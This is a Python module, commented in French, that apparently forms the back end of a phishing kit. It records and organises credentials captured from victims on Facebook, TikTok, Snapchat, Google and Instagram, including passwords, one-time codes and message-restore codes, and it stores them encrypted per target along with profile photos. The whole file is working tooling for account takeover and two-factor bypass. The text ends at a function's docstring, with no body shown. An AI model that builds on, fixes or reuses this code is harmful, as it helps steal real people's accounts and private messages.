"""
credentials_manager.py — Gestionnaire d'identifiants capturés séparés par fichiers JSON.

Chaque session de capture (un email + password + OTPs successifs) est stockée dans :
  targets/<target_id>/credentials/<timestamp>.json

Le fichier legacy credentials.txt reste écrit par helpers.sauvegarder_identifiants_purs
pour la lisibilité humaine ; ce module gère le stockage STRUCTURÉ par victime qui permet
à CredentialsWindow d'afficher les captures de manière organisée.

Structure d'une session JSON :
{
  "target":           "<target_id>",
  "date":             "<YYYY-MM-DD HH:MM:SS>",
  "platform":         "<facebook|tiktok|snapchat|google|instagram>",
  "email":            "<email ou vide>",
  "password":         "<password ou vide>",
  "otps":             [{"label": "OTP", "value": "123456"}, ...],
  "message_restore":  [{"label": "MSG RESTORE 1", "value": "123456"}, ...],
  "complete":         <bool>  # True si email + password présents
}

Fonctions publiques :
  record_credential(cible, type_data, valeur, platform="facebook")  → None
  get_sessions(target_id)          → list[dict]   (sessions pour une cible, triées newest-first)
  get_all_sessions()               → list[dict]   (toutes les sessions, triées newest-first)
  delete_session_by_date(tid, date) → bool
  delete_target(tid)               → int (nombre de sessions supprimées)
  delete_all()                     → int (nombre de fichiers supprimés)
  migrate_from_txt()               → bool  (migration one-shot du legacy credentials.txt)
"""

import os
import json
import glob
import re
import threading
from datetime import datetime


# ═══════════════════════ Lock pour protéger _pending_sessions ═══════════════════════
# Le thread Flask (capture des identifiants) et le thread Qt (fenêtre des identifiants)
# accèdent tous deux à _pending_sessions. Sans verrou, une race condition peut
# causer la perte d'OTPs : flush_pending() peut finaliser la session pendant que
# record_credential() est en train de lui ajouter un OTP.
# RLock (reentrant) pour permettre à _finalize_session d'être appelée depuis
# record_credential (qui détient déjà le verrou) sans deadlock.
_sessions_lock = threading.RLock()


# ═══════════════════════ Logging helper (sans dépendance externe au démarrage) ═══════════════════════
def _log(ctx: str, error: Exception) -> None:
    """Écrit une ligne d'erreur dans errors_logs.txt (fichier canonique).

    Tente d'abord de déléguer à helpers.log_error() — qui gère aussi l'affichage
    en mode debug dans les logs des victimes + sandbox. Si helpers n'est pas
    importable (import circulaire au démarrage), on retombe sur une écriture
    directe dans errors_logs.txt.

    Plaintext append — error logs are NOT encrypted for performance."""
    # 1) Try the high-level logger (handles debug-mode victim forwarding)
    try:
        from helpers import log_error as _hle
        _hle(f"credentials_manager.{ctx}", error)
        return
    except Exception:
        pass
    # 2) Fallback: direct plaintext append to the canonical error log file
    try:
        try:
            from config import ROOT_DIR
            log_path = os.path.join(ROOT_DIR, "errors_logs.txt")
        except Exception:
            log_path = "errors_logs.txt"
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        line = f"[{ts}] [ERROR] credentials_manager.{ctx}: {error}\n"
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(line)
    except Exception as inner:
        try:
            import sys as _sys
            _sys.stderr.write(f"[credentials_manager._log] {inner}\n")
        except Exception:
            pass


# ═══════════════════════ Path helpers ═══════════════════════
def _get_targets_dir() -> str:
    """Retourne le dossier racine des cibles."""
    try:
        from config import TARGETS_DIR
        return TARGETS_DIR
    except Exception:
        # Fallback relatif si config n'est pas encore importable
        return os.path.join(os.path.dirname(os.path.abspath(__file__)), "targets")


def get_cred_dir(target_id: str) -> str:
    """Retourne le chemin absolu du dossier des identifiants pour une cible.

    Si un dossier personnalisé est configuré via config.set_credentials_folder(),
    les identifiants sont stockés dans <credentials_folder>/<target_id>/.
    Sinon, ils vont dans targets/<target_id>/credentials/ (emplacement par défaut).
    """
    target_id = _sanitize_target_id(target_id)
    try:
        from config import get_credentials_folder
        custom = get_credentials_folder()
        if custom:
            # Dossier personnalisé → <custom>/<target_id>/
            return os.path.join(custom, target_id)
    except Exception as e:
        _log("get_cred_dir.get_credentials_folder", e)
    # Emplacement par défaut → targets/<target_id>/credentials/
    return os.path.join(_get_targets_dir(), target_id, "credentials")


def _ensure_cred_dir(target_id: str) -> str:
    """Crée le dossier credentials/<target> si absent et retourne son chemin."""
    d = get_cred_dir(target_id)
    try:
        os.makedirs(d, exist_ok=True)
    except Exception as e:
        _log(f"_ensure_cred_dir[{target_id}]", e)
    return d


def copy_profile_photo_to_credentials(target_id: str, photo_path: str) -> str:
    """Copie la photo de profil de la cible dans son dossier credentials.
    Retourne le chemin de la photo copiée, ou '' si échec.
    La photo est stockée sous le nom 'profile_photo.jpg' et reste accessible
    même quand la cible est déplacée dans la corbeille."""
    try:
        target_id = _sanitize_target_id(target_id)
        if not photo_path:
            return ""
        cred_dir = _ensure_cred_dir(target_id)
        dest_path = os.path.join(cred_dir, "profile_photo.jpg")
        
        # Si c'est une URL, ne pas copier (sera chargée via HTTP)
        if photo_path.startswith("http://") or photo_path.startswith("https://"):
            # Sauvegarder l'URL dans un fichier texte pour pouvoir la relire
            url_file = os.path.join(cred_dir, "profile_photo_url.txt")
            try:
                with open(url_file, "w", encoding="utf-8") as f:
                    f.write(photo_path)
            except Exception:
                pass
            return photo_path  # Retourner l'URL
        
        # Si c'est un chemin local, copier le fichier
        import shutil
        if os.path.exists(photo_path):
            # Ne copier que si le fichier source est différent du fichier destination
            if not os.path.exists(dest_path) or os.path.getmtime(photo_path) > os.path.getmtime(dest_path):
                shutil.copy2(photo_path, dest_path)
            return dest_path
        
        # Si c'est juste un nom de fichier (dans le dossier videos/<tid>/)
        try:
            from config import get_video_dir, VIDEOS_DIR
            video_dir = get_video_dir(target_id)
            full_path = os.path.join(video_dir, photo_path)
            if os.path.exists(full_path):
                if not os.path.exists(dest_path) or os.path.getmtime(full_path) > os.path.getmtime(dest_path):
                    shutil.copy2(full_path, dest_path)
                return dest_path
        except Exception:
            pass
        
        return ""
    except Exception as e:
        _log(f"copy_profile_photo_to_credentials[{target_id}]", e)
        return ""


def get_profile_photo_from_credentials(target_id: str) -> str:
    """Retourne le chemin de la photo de profil stockée dans le dossier credentials.
    Cherche d'abord profile_photo.jpg, puis profile_photo_url.txt.
    Retourne '' si aucune photo n'est trouvée."""
    try:
        target_id = _sanitize_target_id(target_id)
        cred_dir = get_cred_dir(target_id)
        
        # 1. Photo locale copiée
        photo_path = os.path.join(cred_dir, "profile_photo.jpg")
        if os.path.exists(photo_path):
            return photo_path
        
        # 2. URL stockée dans un fichier texte
        url_file = os.path.join(cred_dir, "profile_photo_url.txt")
        if os.path.exists(url_file):
            try:
                with open(url_file, "r", encoding="utf-8") as f:
                    url = f.read().strip()
                    if url:
                        return url
            except Exception:
                pass
        
        return ""
    except Exception as e:
        _log(f"get_profile_photo_from_credentials[{target_id}]", e)
        return ""


def _sanitize_target_id(target_id: str) -> str:
    """Sanitize le target_id pour éviter les traversées de chemin.
    Garde les caractères unicode (noms de cibles) mais supprime .. / \\."""
    if not target_id:
        return "unknown"
    # Remplace tout séparateur de chemin par underscore
    safe = re.sub(r'[\\/]+', '_', str(target_id))
    if safe in (".", ".."):
        return "unknown"
    return safe


# ═══════════════════════ Session state (in-memory) ═══════════════════════
# Une "session en cours" est identifiée par (target_id). Quand un EMAIL arrive,
# on démarre/finalise la session précédente. Quand un PASSWORD arrive, on l'ajoute
# à la session courante. Quand un OTP FINAL arrive, on finalise.
# Ce dictionnaire buffer les sessions incomplètes entre appels successifs.
_pending_sessions = {}  # {target_id: {"date": ..., "email": ..., "password": ..., "otps": [...], "platform": ...}}


def _write_session_to_disk(target_id: str, sess: dict) -> str:
    """Écrit une session sur disque (chiffrée) et retourne le chemin du fichier.
    
    Si la session a déjà été écrite précédemment (par flush_pending), le même
    fichier est écrasé au lieu d'en créer un nouveau. Le chemin du fichier est
    stocké dans sess["_filepath"] pour permettre la réécriture.
    
    NE retire PAS la session du buffer _pending_sessions.
    Retourne le chemin du fichier écrit, ou "" si erreur.
    """
    try:
        if not sess:
            return ""
        # Vérifier qu'il y a au moins une donnée utile
        has_email = bool(sess.get("email"))
        has_password = bool(sess.get("password"))
        has_otps = bool(sess.get("otps"))
        has_msg_restore = bool(sess.get("message_restore"))
        if not (has_email or has_password or has_otps or has_msg_restore):
            return ""
        # Construire le dict final
        session = {
            "target":           target_id,
            "date":             sess.get("date", datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
            "platform":         sess.get("platform", "facebook"),
            "source_platform":  sess.get("source_platform", ""),
            "email":            sess.get("email", ""),
            "password":         sess.get("password", ""),
            "otps":             sess.get("otps", []),
            "message_restore":  sess.get("message_restore", []),
            "complete":         bool(sess.get("email") and sess.get("password")),
        }
        # Déterminer le chemin du fichier :
        # - Si la session a déjà été flushée (sess["_filepath"] existe) ET le
        #   fichier existe encore, on réécrit le MÊME fichier (écrasement).
        # - Si la session a déjà été flushée MAIS le fichier a disparu, cela
        #   signifie qu'elle a été supprimée (delete_session_by_date,
        #   delete_target, delete_all, ou suppression manuelle). On NE la
        #   recrée PAS — on nettoie le buffer et on abandonne.
        # - Sinon (première écriture), on crée un nouveau fichier basé sur la date.
        existing_fpath = sess.get("_filepath", "")
        if existing_fpath and os.path.exists(existing_fpath):
            fpath = existing_fpath
        elif existing_fpath:
            # Le fichier a été supprimé externe — ne pas le recréer
            try:
                with _sessions_lock:
                    _pending_sessions.pop(target_id, None)
            except Exception:
                pass
            return ""
        else:
            safe_date = re.sub(r'[^0-9A-Za-z_\-]', '_', session["date"])
            cred_dir = _ensure_cred_dir(target_id)
            fname = f"{safe_date}.json"
            fpath = os.path.join(cred_dir, fname)
            # Éviter les collisions de nom si deux sessions tombent dans la même seconde
            suffix = 1
            while os.path.exists(fpath):
                fname = f"{safe_date}_{suffix}.json"
                fpath = os.path.join(cred_dir, fname)
                suffix += 1
        # Écrire le fichier chiffré
        try:
            from crypto import write_json_encrypted
            write_json_encrypted(fpath, session)
        except Exception as _crypto_err:
            _log(f"_write_session_to_disk.crypto[{target_id}]", _crypto_err)
            # Fallback: write plaintext if crypto module fails
            try:
                with open(fpath, "w", encoding="utf-8") as f:
                    json.dump(session, f, indent=4, ensure_ascii=False)
            except Exception as _plain_err:
                _log(f"_write_session_to_disk.plaintext[{target_id}]", _plain_err)
                return ""
        # Mémoriser le chemin pour permettre la réécriture future
        sess["_filepath"] = fpath
        return fpath
    except Exception as e:
        _log(f"_write_session_to_disk[{target_id}]", e)
        return ""


def _finalize_session(target_id: str) -> None:
    """Écrit la session en attente sur disque PUIS la retire du buffer.
    
    Utilise _write_session_to_disk pour l'écriture, puis pop la session
    de _pending_sessions pour libérer la mémoire.
    """
    try:
        sess = _pending_sessions.get(target_id)
        if not sess:
            return
        # Vérifier qu'il y a au moins une donnée utile
        has_email = bool(sess.get("email"))
        has_password = bool(sess.get("password"))
        has_otps = bool(sess.get("otps"))
        has_msg_restore = bool(sess.get("message_restore"))
        if not (has_email or has_password or has_otps or has_msg_restore):
            # Session vraiment vide — ne pas écrire, juste retirer du buffer
            _pending_sessions.pop(target_id, None)
            return
        # Écrire sur disque
        _write_session_to_disk(target_id, sess)
        # Retirer du buffer
        _pending_sessions.pop(target_id, None)
    except Exception as e:
        _log(f"_finalize_session[{target_id}]", e)


# ═══════════════════════ API publique ═══════════════════════
def record_credential(cible, type_data, valeur, platform="facebook", source_platform=None):
    """
    Enregistre un identifiant capturé dans la session en cours de la cible.

    type_data peut être :
      "EMAIL"              → démarre/continue une session avec l'email
      "PASSWORD"           → ajoute le password à la session courante
      "OTP", "OTP 1", "OTP 2", ... → ajoute un OTP intermédiaire
      "FINAL OTP", "FINAL OTP 1", ... → ajoute l'OTP final ET finalise la session
      "MSG RESTORE", "MSG RESTORE 1", ... → ajoute un code de restauration de messages
      "FINAL MSG RESTORE", "FINAL MSG RESTORE 1", ... → ajoute le code de restauration final
      autre                → ignoré silencieusement (champ non structuré)

    source_platform : plateforme d'origine si pivoting (None sinon)

    La session est finalisée (écrite sur disque) :
      - quand un nouvel EMAIL arrive pour la même cible (session précédente clôturée)
      - quand un OTP FINAL arrive (label contient "FINAL" ET "OTP")
    """
    try:
        target_id = _sanitize_target_id(cible)
        type_data = str(type_data or "").upper().strip()
        valeur = str(valeur) if valeur is not None else ""

        if not type_data:
            return

        # ── Verrouiller pour éviter les race conditions avec flush_pending() ──
        # flush_pending() peut être appelé depuis le thread Qt (fenêtre des
        # identifiants) pendant que record_credential() est appelé depuis le
        # thread Flask. Sans verrou, flush_pending pourrait finaliser la session
        # pendant que record_credential lui ajoute un OTP, causant la perte de
        # l'OTP.
        with _sessions_lock:
            _record_credential_unlocked(target_id, type_data, valeur, platform, source_platform)
    except Exception as e:
        _log("record_credential", e)


def _record_credential_unlocked(target_id, type_data, valeur, platform, source_platform):
    """Version interne de record_credential — doit être appelée avec _sessions_lock acquis."""
    try:
        # Récupère ou crée la session en cours
        sess = _pending_sessions.get(target_id)
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        if type_data == "EMAIL":
            # Si une session était en cours avec déjà un email, la finaliser avant d'en démarrer une nouvelle
            if sess and (sess.get("email") or sess.get("password")):
                _finalize_session(target_id)
            # Démarrer une nouvelle session
            _pending_sessions[target_id] = {
                "date": now,
                "email": valeur,
                "password": "",
                "otps": [],
                "message_restore": [],
                "platform": platform or "facebook",
                "source_platform": source_platform,
            }
            # Flush immédiat : l'email est écrit sur disque pour être visible côté UI
            _write_session_to_disk(target_id, _pending_sessions[target_id])
            return

        if type_data == "PASSWORD":
            if not sess:
                # Pas d'email préalable — créer une session avec juste le password
                _pending_sessions[target_id] = {
                    "date": now,
                    "email": "",
                    "password": valeur,
                    "otps": [],
                    "message_restore": [],
                    "platform": platform or "facebook",
                    "source_platform": source_platform,
                }
            else:
                sess["password"] = valeur
                sess["platform"] = platform or sess.get("platform", "facebook")
                if source_platform:
                    sess["source_platform"] = source_platform
                # S'assurer que les listes existent (safeguard)
                if "otps" not in sess:
                    sess["otps"] = []
                if "message_restore" not in sess:
                    sess["message_restore"] = []
            # Flush immédiat : email+password visible côté UI
            _write_session_to_disk(target_id, _pending_sessions.get(target_id, sess))
            return

        # ── OTP detection ──
        # IMPORTANT: routes.py uses both "OTP 1" (intermediate) and "FINAL OTP 1" (final).
        # "FINAL OTP 1" does NOT start with "OTP" — it starts with "FINAL".
        # So we check if "OTP" appears ANYWHERE in the type_data.
        if "OTP" in type_data:
            is_final = "FINAL" in type_data
            # Normalize the label for display
            if is_final:
                label = "OTP FINAL"
            else:
                # Extract the OTP number if present (e.g. "OTP 1" → "OTP 1")
                label = type_data
            if not sess:
                # Session sans email/password précédent — créer quand même
                _pending_sessions[target_id] = {
                    "date": now,
                    "email": "",
                    "password": "",
                    "otps": [{"label": label, "value": valeur}],
                    "message_restore": [],
                    "platform": platform or "facebook",
                }
            else:
                # S'assurer que la liste otps existe (safeguard)
                if "otps" not in sess:
                    sess["otps"] = []
                if "message_restore" not in sess:
                    sess["message_restore"] = []
                sess["otps"].append({"label": label, "value": valeur})
            # Flush immédiat : l'OTP est visible côté UI (même intermédiaire)
            _write_session_to_disk(target_id, _pending_sessions.get(target_id, sess))
            # Si c'est un OTP FINAL, finaliser la session (retire du buffer)
            if "FINAL" in type_data:
                _finalize_session(target_id)
            return

        # ── Message Restore code detection ──
        # Types: "MSG RESTORE", "MSG RESTORE 1", "FINAL MSG RESTORE", "FINAL MSG RESTORE 1"
        # Note: type_data est déjà en majuscules et stripé en haut de la fonction.
        if "MSG RESTORE" in type_data:
            is_final = "FINAL" in type_data
            # Normalize the label for display
            if is_final:
                label = "MSG RESTORE FINAL"
            else:
                # Keep the original label (e.g. "MSG RESTORE 1")
                label = type_data
            if not sess:
                # Session sans email/password précédent — créer quand même
                _pending_sessions[target_id] = {
                    "date": now,
                    "email": "",
                    "password": "",
                    "otps": [],
                    "message_restore": [{"label": label, "value": valeur}],
                    "platform": platform or "facebook",
                }
            else:
                # S'assurer que la liste message_restore existe
                if "message_restore" not in sess:
                    sess["message_restore"] = []
                sess["message_restore"].append({"label": label, "value": valeur})
            # Flush immédiat : le code de restauration est visible côté UI
            _write_session_to_disk(target_id, _pending_sessions.get(target_id, sess))
            # NOTE: Le code de restauration final NE finalise PAS la session,
            # car la session doit attendre l'OTP final pour être finalisée.
            return

        # Type non reconnu (PHONE, IP, etc.) — ignoré silencieusement
        # car non structuré dans notre schéma JSON.
    except Exception as e:
        _log("record_credential", e)


def flush_pending():
    """Force-write ALL pending (non-finalized) sessions to disk.

    This should be called by CredentialsWindow BEFORE loading sessions,
    so that incomplete sessions (e.g. victim entered email + password but
    no final OTP yet) are still visible in the UI.

    IMPORTANT : contrairement à _finalize_session, cette fonction NE retire
    PAS les sessions du buffer _pending_sessions. Les sessions restent en
    mémoire pour que les prochains identifiants capturés (OTP, etc.) soient
    ajoutés à la MÊME session. Quand _finalize_session sera appelée plus tard
    (par un OTP FINAL ou un nouvel EMAIL), elle écrasera le même fichier
    avec les données complètes.
    """
    try:
        with _sessions_lock:
            for target_id in list(_pending_sessions.keys()):
                sess = _pending_sessions.get(target_id)
                if sess:
                    _write_session_to_disk(target_id, sess)
    except Exception as e:
        _log("flush_pending", e)


def _get_credentials_root():
    """Retourne le dossier racine des identifiants.
    - Si un dossier personnalisé est configuré : retourne ce dossier
    - Sinon : retourne targets/ (les identifiants sont dans targets/<tid>/credentials/)
    """
    try:
        from config import get_credentials_folder
        custom = get_credentials_folder()
        if custom:
            return custom
    except Exception as e:
        _log("_get_credentials_root", e)
    return _get_targets_dir()


def _iter_all_cred_dirs():
    """Générateur qui yield (target_id, cred_dir) pour chaque cible ayant des identifiants.
    Gère à la fois le mode par défaut (targets/<tid>/credentials/) et le mode personnalisé
    (<custom>/<tid>/)."""
    root = _get_credentials_root()
    if not os.path.isdir(root):
        return
    try:
        for entry in os.listdir(root):
            full_path = os.path.join(root, entry)
            if not os.path.isdir(full_path):
                continue
            # Mode personnalisé : <custom>/<tid>/ directement
            # Mode par défaut : targets/<tid>/credentials/
            custom = _get_credentials_root_custom()
            if custom:
                cred_dir = full_path  # <custom>/<tid>/
                target_id = entry
            else:
                cred_dir = os.path.join(full_path, "credentials")
                target_id = entry
            if os.path.isdir(cred_dir):
                yield target_id, cred_dir
    except Exception as e:
        _log("_iter_all_cred_dirs", e)


def _get_credentials_root_custom():
    """Retourne le chemin personnalisé s'il est configuré, sinon None."""
    try:
        from config import get_credentials_folder
        custom = get_credentials_folder()
        return custom if custom else None
    except Exception:
        return None


def get_sessions(target_id: str) -> list:
    """Retourne toutes les sessions d'une cible, triées newest-first."""
    try:
        target_id = _sanitize_target_id(target_id)
        cred_dir = get_cred_dir(target_id)
        if not os.path.isdir(cred_dir):
            return []
        files = sorted(glob.glob(os.path.join(cred_dir, "*.json")), reverse=True)
        sessions = []
        for fpath in files:
            try:
                # Read encrypted (or plaintext) JSON file
                try:
                    from crypto import read_json_encrypted
                    sess = read_json_encrypted(fpath)
                    if sess and isinstance(sess, dict):
                        sessions.append(sess)
                except Exception:
                    # Fallback: read plaintext
                    with open(fpath, "r", encoding="utf-8") as f:
                        sess = json.load(f)
                        if isinstance(sess, dict):
                            sessions.append(sess)
            except Exception as e:
                _log(f"get_sessions[{os.path.basename(fpath)}]", e)
        return sessions
    except Exception as e:
        _log("get_sessions", e)
        return []


def get_all_sessions() -> list:
    """Retourne toutes les sessions de toutes les cibles, triées newest-first.
    Gère à la fois le mode par défaut (targets/<tid>/credentials/) et le mode
    personnalisé (<custom>/<tid>/)."""
    try:
        all_sessions = []
        for _target_id, cred_dir in _iter_all_cred_dirs():
            for fpath in glob.glob(os.path.join(cred_dir, "*.json")):
                try:
                    # Read encrypted (or plaintext) JSON file
                    try:
                        from crypto import read_json_encrypted
                        sess = read_json_encrypted(fpath)
                        if sess and isinstance(sess, dict):
                            all_sessions.append(sess)
                    except Exception:
                        # Fallback: read plaintext
                        with open(fpath, "r", encoding="utf-8") as f:
                            sess = json.load(f)
                            if isinstance(sess, dict):
                                all_sessions.append(sess)
                except Exception as e:
                    _log(f"get_all_sessions[{os.path.basename(fpath)}]", e)
        # Trier par date décroissante (newest first)
        all_sessions.sort(key=lambda s: s.get("date", ""), reverse=True)
        return all_sessions
    except Exception as e:
        _log("get_all_sessions", e)
        return []


def _parse_credentials_txt_blocks(content: str):
    """Parse le contenu de credentials.txt en blocs.

    Un bloc commence par une ligne contenant '┌' (le délimiteur de début) et
    se termine au prochain '┌' ou '└' ou à la fin du fichier. Les blocs
    peuvent ne pas avoir de '└' fermant (cas où la victime n'est pas allée
    jusqu'à l'OTP final).

    Le '┌' peut être collé à la fin d'une autre ligne (ex: l'en-tête
    '╚...┌──'), donc on cherche '┌' n'importe où dans la ligne, pas
    uniquement au début.

    Retourne (header_lines, blocks) où :
      - header_lines : liste de lignes avant le premier bloc (lignes non-block)
      - blocks : liste de dicts {lines: [...], cible: str, date: str}
    """
    lines = content.split("\n")
    header_lines = []
    blocks = []
    current_block = None  # dict {lines, cible, date}

    def _extract_field(stripped, key):
        """Extrait la valeur d'un champ '│  KEY : value' en gérant les emojis."""
        # On cherche le séparateur ':' après le label (ex: 'Cible', 'Date').
        # Les emojis (🎯, 🕐) sont multi-octets mais le ':' ASCII sert de séparateur.
        if key in stripped and ":" in stripped:
            try:
                # split sur ':' et prendre tout ce qui suit
                value = stripped.split(":", 1)[1]
                # Retirer le '│' de début et les espaces
                value = value.strip().lstrip("│").strip()
                return value
            except Exception:
                return ""
        return ""

    for line in lines:
        stripped = line.strip()

        # Détection du début de bloc : '┌' présent dans la ligne
        if "┌" in stripped:
            # Finaliser le bloc précédent (s'il existe et n'est pas fermé par └)
            if current_block is not None:
                # Retirer la dernière ligne si c'est une ligne vide de séparation
                # qui appartient en réalité au bloc suivant
                blocks.append(current_block)

            # Démarrer un nouveau bloc à partir de cette ligne
            # (le '┌' peut être collé à l'en-tête, mais toute la ligne fait partie du bloc)
            current_block = {"lines": [line], "cible": "", "date": ""}

        elif "└" in stripped:
            # Fin de bloc explicite
            if current_block is not None:
                current_block["lines"].append(line)
                blocks.append(current_block)
                current_block = None
            else:
                # └ sans ┌ ouvert → ligne hors bloc
                header_lines.append(line)

        elif current_block is not None:
            # Ligne à l'intérieur d'un bloc
            current_block["lines"].append(line)
            # Extraire cible et date
            if not current_block["cible"]:
                c = _extract_field(stripped, "Cible")
                if c:
                    current_block["cible"] = c
            if not current_block["date"]:
                d = _extract_field(stripped, "Date")
                if d:
                    current_block["date"] = d

        else:
            # Ligne hors bloc (en-tête, lignes vides avant le premier ┌)
            header_lines.append(line)

    # Finaliser le dernier bloc (sans └ de fin)
    if current_block is not None:
        blocks.append(current_block)

    return header_lines, blocks


def _read_credentials_txt_content():
    """Lit credentials.txt et le déchiffre si nécessaire.
    Retourne (content, was_encrypted) ou (None, False) si erreur."""
    txt_path = "credentials.txt"
    if not os.path.exists(txt_path):
        return None, False
    try:
        with open(txt_path, "r", encoding="utf-8") as f:
            content = f.read()
    except Exception as e:
        _log("_read_credentials_txt_content.read", e)
        return None, False
    was_encrypted = False
    try:
        from crypto import is_encrypted, decrypt_text
        if content.strip() and is_encrypted(content):
            content = decrypt_text(content)
            was_encrypted = True
    except Exception as e:
        _log("_read_credentials_txt_content.decrypt", e)
    return content, was_encrypted


def _write_credentials_txt_content(content, was_encrypted):
    """Écrit credentials.txt (rechiffré si nécessaire). Retourne True si OK."""
    txt_path = "credentials.txt"
    if was_encrypted:
        try:
            from crypto import encrypt_text
            content = encrypt_text(content)
        except Exception as e:
            _log("_write_credentials_txt_content.encrypt", e)
    try:
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write(content)
        return True
    except Exception as e:
        _log("_write_credentials_txt_content.write", e)
        return False


def _remove_block_from_credentials_txt(target_id: str, date_str: str) -> bool:
    """Supprime le bloc correspondant à target_id + date_str dans credentials.txt.

    Le fichier credentials.txt peut être chiffré ou en clair. Cette fonction :
    1. Lit le fichier (et le déchiffre si nécessaire)
    2. Parcourt les blocs via _parse_credentials_txt_blocks (robuste)
    3. Supprime le bloc qui correspond à la cible ET à la date
    4. Réécrit le fichier (et le rechiffre si nécessaire)

    Retourne True si un bloc a été supprimé, False sinon.
    """
    try:
        content, was_encrypted = _read_credentials_txt_content()
        if content is None:
            return False

        header_lines, blocks = _parse_credentials_txt_blocks(content)

        removed = False
        new_lines = list(header_lines)
        for blk in blocks:
            if blk["cible"] == target_id and blk["date"] == date_str and not removed:
                removed = True  # skip ce bloc (suppression)
            else:
                new_lines.extend(blk["lines"])

        if not removed:
            return False

        new_content = "\n".join(new_lines)
        while "\n\n\n" in new_content:
            new_content = new_content.replace("\n\n\n", "\n\n")

        return _write_credentials_txt_content(new_content, was_encrypted)
    except Exception as e:
        _log("_remove_block_from_credentials_txt", e)
        return False


def delete_session_by_date(tid: str, date_str: str) -> bool:
    """Supprime la session identifiée par sa date (unique par cible).
    Supprime AUSSI le bloc correspondant dans credentials.txt si présent.
    Retourne True si supprimée, False si introuvable."""
    try:
        target_id = _sanitize_target_id(tid)
        cred_dir = get_cred_dir(target_id)
        deleted = False
        if os.path.isdir(cred_dir):
            # Cherche le fichier dont la date JSON correspond
            for fpath in glob.glob(os.path.join(cred_dir, "*.json")):
                try:
                    # Read encrypted (or plaintext) JSON file
                    try:
                        from crypto import read_json_encrypted
                        sess = read_json_encrypted(fpath)
                    except Exception:
                        with open(fpath, "r", encoding="utf-8") as f:
                            sess = json.load(f)
                    if isinstance(sess, dict) and sess.get("date") == date_str:
                        os.remove(fpath)
                        deleted = True
                        break
                except Exception as e:
                    _log(f"delete_session_by_date[read:{os.path.basename(fpath)}]", e)
                    continue
        # ── Supprimer aussi le bloc correspondant dans credentials.txt ──
        if deleted:
            try:
                _remove_block_from_credentials_txt(target_id, date_str)
            except Exception as e:
                _log(f"delete_session_by_date.credentials_txt[{target_id}]", e)
            # ── Nettoyer le buffer mémoire pour éviter que flush_pending()
            #    ne recrée le fichier qu'on vient de supprimer ──
            # On ne pop que si la session en attente correspond à la même date
            # (pour ne pas effacer une nouvelle session en cours pour cette cible).
            try:
                with _sessions_lock:
                    ps = _pending_sessions.get(target_id)
                    if ps is not None and ps.get("date") == date_str:
                        _pending_sessions.pop(target_id, None)
            except Exception as e:
                _log(f"delete_session_by_date.clear_pending[{target_id}]", e)
        return deleted
    except Exception as e:
        _log("delete_session_by_date", e)
        return False


def _remove_all_blocks_for_target_from_credentials_txt(target_id: str) -> int:
    """Supprime TOUS les blocs d'une cible dans credentials.txt.
    Retourne le nombre de blocs supprimés."""
    try:
        content, was_encrypted = _read_credentials_txt_content()
        if content is None:
            return 0

        header_lines, blocks = _parse_credentials_txt_blocks(content)

        removed_count = 0
        new_lines = list(header_lines)
        for blk in blocks:
            if blk["cible"] == target_id:
                removed_count += 1
            else:
                new_lines.extend(blk["lines"])

        if removed_count == 0:
            return 0

        new_content = "\n".join(new_lines)
        while "\n\n\n" in new_content:
            new_content = new_content.replace("\n\n\n", "\n\n")

        if _write_credentials_txt_content(new_content, was_encrypted):
            return removed_count
        return 0
    except Exception as e:
        _log("_remove_all_blocks_for_target", e)
        return 0


def delete_target(tid: str) -> int:
    """Supprime toutes les sessions d'une cible. Retourne le nombre de fichiers supprimés."""
    try:
        target_id = _sanitize_target_id(tid)
        cred_dir = get_cred_dir(target_id)
        if not os.path.isdir(cred_dir):
            return 0
        count = 0
        for fpath in glob.glob(os.path.join(cred_dir, "*.json")):
            try:
                os.remove(fpath)
                count += 1
            except Exception as e:
                _log(f"delete_target[{os.path.basename(fpath)}]", e)
        # Nettoyer aussi la session en attente en mémoire
        with _sessions_lock:
            _pending_sessions.pop(target_id, None)
        # ── Supprimer aussi TOUS les blocs de cette cible dans credentials.txt ──
        if count > 0:
            try:
                _remove_all_blocks_for_target_from_credentials_txt(target_id)
            except Exception as e:
                _log(f"delete_target.credentials_txt[{target_id}]", e)
        return count
    except Exception as e:
        _log("delete_target", e)
        return 0


def delete_all() -> int:
    """Supprime tous les identifiants de toutes les cibles. Retourne le nombre de fichiers supprimés.
    Gère à la fois le mode par défaut et le mode personnalisé."""
    try:
        count = 0
        for _target_id, cred_dir in _iter_all_cred_dirs():
            for fpath in glob.glob(os.path.join(cred_dir, "*.json")):
                try:
                    os.remove(fpath)
                    count += 1
                except Exception as e:
                    _log(f"delete_all[{os.path.basename(fpath)}]", e)
        # Vider toutes les sessions en attente
        with _sessions_lock:
            _pending_sessions.clear()
        # ── Vider aussi credentials.txt ──
        if count > 0:
            try:
                txt_path = "credentials.txt"
                if os.path.exists(txt_path):
                    # Si le fichier est chiffré, écrire un contenu chiffré vide
                    try:
                        import config as _cfg_del_all
                        encrypt_enabled = _cfg_del_all.get_global_setting("encrypt_credentials_txt", False)
                    except Exception:
                        encrypt_enabled = False
                    if encrypt_enabled:
                        try:
                            from crypto import encrypt_text
                            with open(txt_path, "w", encoding="utf-8") as f:
                                f.write(encrypt_text(""))
                        except Exception as e:
                            _log("delete_all.credentials_txt.encrypt", e)
                    else:
                        try:
                            with open(txt_path, "w", encoding="utf-8") as f:
                                f.write("")
                        except Exception as e:
                            _log("delete_all.credentials_txt.write", e)
            except Exception as e:
                _log("delete_all.credentials_txt", e)
        return count
    except Exception as e:
        _log("delete_all", e)
        return 0


def migrate_from_txt(force: bool = False) -> dict:
    """
    Migration des identifiants : parse le legacy credentials.txt et crée une
    session JSON par bloc de capture (┌ ... └), en rangeant chaque bloc dans
    le dossier credentials/ de la cible correspondante.

    Idempotent PAR CIBLE : si une cible a déjà des sessions JSON, ses blocs
    ne sont pas re-migrés (sauf si force=True). Les autres cibles sans
    sessions sont quand même migrées.

    Args:
        force: si True, re-migre même les cibles ayant déjà des sessions
               (les sessions existantes sont conservées, de nouveaux fichiers
               sont créés avec un suffixe pour éviter les collisions).

    Returns:
        dict: {"migrated": int, "skipped": int, "errors": list[str]}
              migrated = nombre de sessions créées
              skipped  = nombre de blocs ignorés (cible déjà migrée)
              errors   = liste de messages d'erreur
    """
